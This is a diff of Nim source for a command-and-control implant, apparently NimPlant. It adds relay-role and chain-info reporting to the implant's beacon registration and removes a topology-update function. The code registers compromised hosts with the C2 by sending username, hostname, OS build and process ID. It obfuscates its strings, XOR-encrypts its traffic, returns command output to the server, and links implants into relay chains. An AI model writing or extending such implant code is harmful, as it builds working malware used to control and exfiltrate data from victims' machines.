@@ -251,10 +251,11 @@ proc init*(li: var Listener) : void =
         li.initialized = false
 
 # Initial registration function, including key init
-proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool) : void =
+proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool, relayRole : string = "STANDARD") : void =
     # Once key is known, send a second request to register implant with initial info
     when defined verbose:
         echo obf("DEBUG: Sending registration request with ID: ") & li.id
+        echo obf("DEBUG: Relay role: ") & relayRole
     
     var data = %*
         [
@@ -265,7 +266,8 @@ proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : stri
                 "o": osBuild,
                 "p": pid,
                 "P": pname,
-                "r": riskyMode
+                "r": riskyMode,
+                "R": relayRole
             }
         ]
     var dataStr = ($data)[1..^2]
@@ -303,10 +305,11 @@ proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : stri
             echo obf("DEBUG: Registration successful. Implant now registered with ID: ") & li.id
 
 # Relay forwarding registration function - returns assigned ID and encryption key
-proc postRelayRegisterRequest*(li : var Listener, relayClientID: string, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool) : (string, string) =
+proc postRelayRegisterRequest*(li : var Listener, relayClientID: string, ipAddrInt : string, username : string, hostname : string, osBuild : string, pid : int, pname : string, riskyMode : bool, relayRole : string = "RELAY_CLIENT") : (string, string) =
     # Forward registration for relay client using the relay client's ID
     when defined verbose:
         echo obf("DEBUG: Forwarding relay registration with relay client ID: ") & relayClientID
+        echo obf("DEBUG: Relay role: ") & relayRole
     
     var data = %*
         [
@@ -317,7 +320,8 @@ proc postRelayRegisterRequest*(li : var Listener, relayClientID: string, ipAddrI
                 "o": osBuild,
                 "p": pid,
                 "P": pname,
-                "r": riskyMode
+                "r": riskyMode,
+                "R": relayRole
             }
         ]
     var dataStr = ($data)[1..^2]
@@ -354,6 +358,7 @@ proc postRelayRegisterRequest*(li : var Listener, relayClientID: string, ipAddrI
             echo obf("DEBUG: 🚨 - C2 assigned ID: ") & clientId
             echo obf("DEBUG: 🚨 - Request IP: ") & ipAddrInt
             echo obf("DEBUG: 🚨 - Request hostname: ") & hostname
+            echo obf("DEBUG: 🚨 - Relay role: ") & relayRole
             echo obf("DEBUG: 🚨 - C2 full response: ") & initRes.body
           
         # Decode and XOR the key
@@ -490,26 +495,7 @@ proc postCommandResults*(li : Listener, cmdGuid : string, output : string) : voi
     var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
     discard doRequest(li, li.resultPath, "data", encryptData(data, li.UNIQUE_XOR_KEY), "post")
 
-# Send topology update to C2 server
-proc postTopologyUpdate*(li : Listener, topologyData : string) : void =
-    when defined verbose:
-        echo obf("DEBUG: Sending topology update to C2 server")
-        echo obf("DEBUG: Topology data (first 100 chars): ") & 
-             (if topologyData.len > 100: topologyData[0..99] & "..." else: topologyData)
-    
-    let encryptedData = encryptData(topologyData, li.UNIQUE_XOR_KEY)
-    let topologyPath = li.resultPath & obf("/topology")
-    
-    when defined verbose:
-        echo obf("DEBUG: Topology path: ") & topologyPath
-        echo obf("DEBUG: Encrypted topology data length: ") & $encryptedData.len
-    
-    let res = doRequest(li, topologyPath, "data", encryptedData, "post")
-    
-    when defined verbose:
-        echo obf("DEBUG: Topology update response code: ") & $res.code
-        if res.code != 200:
-            echo obf("DEBUG: Topology update response body: ") & res.body
+# postTopologyUpdate removed - using distributed chain relationships system
 
 # Announce that the kill timer has expired
 proc killSelf*(li : Listener) : void =
@@ -758,3 +744,34 @@ proc removeStoredImplantID() =
             removeFile(persistPath)
     except:
         discard
+
+# Add chain info reporting function
+proc postChainInfo*(listener: Listener, myGuid: string, parentGuid: string = "", myRole: string = "STANDARD", listeningPort: int = 0) =
+    try:
+        let chainData = %*{
+            "type": "chain_info",
+            "nimplant_guid": myGuid,
+            "parent_guid": if parentGuid == "": newJNull() else: %parentGuid,
+            "my_role": myRole,
+            "listening_port": listeningPort,
+            "timestamp": epochTime().int64
+        }
+        
+        when defined debug:
+            echo "[DEBUG] 📡 HTTP: Sending chain info to C2: " & $chainData
+        
+        # Encrypt chain data using the same pattern as other endpoints
+        let encryptedData = encryptData($chainData, listener.UNIQUE_XOR_KEY)
+        
+        let response = doRequest(listener, "/chain", "data", encryptedData, "post")
+        
+        when defined debug:
+            if response.body != "":
+                echo "[DEBUG] 📡 HTTP: C2 response to chain info: " & response.body
+            else:
+                echo "[DEBUG] 📡 HTTP: Chain info sent successfully (code: " & $response.code & ")"
+                
+    except Exception as e:
+        when defined debug:
+            echo "[DEBUG] 📡 HTTP: Error sending chain info: " & e.msg
+
